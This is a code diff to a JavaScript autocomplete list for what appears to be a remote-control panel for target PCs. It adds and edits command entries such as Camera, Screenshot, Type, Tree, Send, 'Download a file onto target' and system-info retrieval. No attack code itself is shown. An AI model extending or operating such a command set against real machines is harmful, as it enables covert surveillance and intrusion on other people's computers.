@@ -1,3 +1,5 @@
+// TODO Keyboard shortcuts.
+
 maxie(4); // Default Layout
 $("div.split-pane").splitPane(); //draggable handles
 
@@ -327,18 +329,21 @@ pause
  {helper: 'Lock("");', value: "Lock();", args: true, meta: " Select Target"},
  {helper: 'Class("");', value: "Class();", args: true, meta: " Select a particular class of PCs"},
  {helper: "All();", value: "All();", args: false, meta: " Selects All system"},
+ {helper: 'Prompt("What is your body count..");', value: "Prompt();", args: true, meta: " Prompts user for an input."},
  {helper: 'Info("This is an Información..");', value: "Info();", args: true, meta: " Shows Info box"},
  {helper: 'Warn("This is an Warning..");', value: "Warn();", args: true, meta: " Shows Warning Box"},
  {helper: 'Error("This is an Error..");', value: "Error();", args: true, meta: " Shows Error box"},
- {helper: 'Msgbox("Im Batman..",4500);', value: "Msgbox();", args: true, meta: " Shows Msg Box fo 'y' ms"},
+ {helper: 'Timebox("Message Here..",0,16,4096,"Title..",5000);', value: "Timebox();", args: true, meta: " Shows Msg Box fo 'y' ms"},
  {helper: 'Google("Hi, How are you doing?..");', value: "Google();", args: true, meta: " Googles selected Text"},
- {helper: 'Web("https://www.google.com");', value: "Web();", args: true, meta: " Navigates to 'x' url"},
+ {helper: 'Web("https://www.google.com");', value: "Web();", args: true, meta: " Navigates to a specific URL."},
  {helper: 'Type("Hello, My name is Casper..");', value: "Type();", args: true, meta: " Types custom text"},
  {helper: 'Screenshot("");', value: "Screenshot();", args: true, meta: " Takes a Screenshot"},
  {helper: 'Camera("");', value: "Camera();", args: true, meta: " Captures a Photo"},
- {helper: "Details();", value: "Disk();", args: false, meta: " Retrieves Disk Info"},
+ {helper: "Details();", value: "Details();", args: false, meta: " Retrieves System Info"},
+ {helper: "Disk();", value: "Disk();", args: false, meta: " Retrieves Disk Info"},
  {helper: 'Tree("C:\\..");', value: "Tree();", args: true, meta: " Retrieves Disk Info"},
- {helper: 'Send("");', value: "Send();", args: true, meta: " Sends a File"},
+ {helper: 'Send("https://www...");', value: "Send();", args: true, meta: " Sends a File"},
+ {helper: 'Download("https://www...");', value: "Download();", args: true, meta: " Downloads a file onto target."},
  {helper: 'Zip("");', value: "Zip();", args: true, meta: " Zip a folder"},
  {helper: 'Unzip("");', value: "Unzip();", args: true, meta: " Unzips file"},
  {helper: "Health();", value: "Health();", args: false, meta: " Reports back working conditions"},
@@ -353,6 +358,7 @@ var staticWordCompleter = {
   let line = session.getLine(pos.row);
   let lineStart = line.slice(0, pos.column - prefix.length);
   if (/PC\.\s*$/.test(lineStart)) {
+   //  TODO editor.getCursorPosition()+1 == EOL
    if (prefix.length == 0) {
     fst = pos;
    }
